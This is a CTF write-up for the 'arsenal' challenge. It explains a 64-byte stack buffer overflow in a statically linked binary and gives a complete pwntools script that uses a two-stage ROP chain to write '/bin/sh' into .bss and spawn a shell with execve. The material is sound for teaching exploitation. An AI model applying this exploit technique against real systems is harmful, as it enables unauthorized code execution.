### arsenal - ROP w/ Stack Buffer Overflow

> x Exam (35)

The examination of the provided source code for the arsenal challenge exposes a classic memory corruption vulnerability within the `vuln` function. A local character array of sixty four bytes is allocated on the stack, yet the `read` system call is instructed to accept up to five hundred and twelve bytes from the standard input file descriptor. This significant discrepancy guarantees a stack buffer overflow, granting complete control over the saved return address and the subsequent execution flow.

> A statically linked binary encapsulates all required library code directly within the executable file itself, removing the dependency on external dynamic shared objects during runtime. This compilation method significantly increases the file size and inadvertently provides an attacker with a massive repository of executable gadgets, as the entirety of the standard C library is mapped into executable memory.

The primary difficulty in this scenario arises from the intentional absence of high level exploitation targets. The binary does not contain a predefined `win` function, it lacks the `system` function wrapper typically used to execute shell commands, and a preliminary search will confirm that the literal string `"/bin/sh"` is entirely absent from the binary. To achieve arbitrary code execution, the payload must circumvent the standard library completely and interface directly with the Linux kernel through system calls.

The ultimate objective is to invoke the `execve` system call, which requires the `RAX` register to contain the value fifty nine. The System V AMD64 Application Binary Interface dictates that the first argument, a pointer to the executable path, must reside in `RDI`. The second and third arguments, representing the argument vector and environment pointers, must be placed in `RSI` and `RDX`, respectively, and can generally be set to null for a simple shell execution.

Because the required `"/bin/sh"` string does not exist, the Return Oriented Programming chain must be architected in two distinct, sequential stages. The provided source code includes a globally scoped, uninitialized array named `armory`, which will be located within the writable `.bss` memory segment. The initial phase of the chain must construct a `read` system call, where `RAX` is set to zero, to accept the missing string from standard input and write it directly into the `armory` buffer. Once this data is written to memory, the second phase of the chain will set `RDI` to the address of the `armory` buffer, clear the `RSI` and `RDX` registers, load the value fifty nine into `RAX`, and trigger the final `syscall` gadget to successfully spawn the shell environment.

```python
#!/usr/bin/env python3  
from pwn import *  
  
elf = ELF('./arsenal', checksec=False)  
context.binary = elf  
context.arch = 'amd64'  
  
OFFSET_TO_RIP = 72  
  
pop_rdi = elf.sym.pop_rdi_ret  
pop_rsi = elf.sym.pop_rsi_ret  
pop_rdx = elf.sym.pop_rdx_ret  
pop_rax = elf.sym.pop_rax_ret  
syscall = elf.sym.syscall_ret  
armory_addr = elf.sym.armory  
  
HOST = "offsec.m0lecon.it"  
PORT = 13562  
  
def conn():  
    if not args.LOCAL:  
        return remote(HOST, PORT)  
    return process(elf.path)  
  
p = conn()  
  
payload = flat(  
    b'A' * OFFSET_TO_RIP,  
    p64(pop_rdi),  
    p64(0),  
    p64(pop_rsi),  
    p64(armory_addr),  
    p64(pop_rdx),  
    p64(8),  
    p64(pop_rax),  
    p64(0),  
    p64(syscall),  
    p64(pop_rdi),  
    p64(armory_addr),  
    p64(pop_rsi),  
    p64(0),  
    p64(pop_rdx),  
    p64(0),  
    p64(pop_rax),  
    p64(59),  
    p64(syscall)  
)  
  
p.recvuntil(b"weapons:\n")  
p.send(payload)  
p.send(b"/bin/sh\x00")  
p.interactive()
```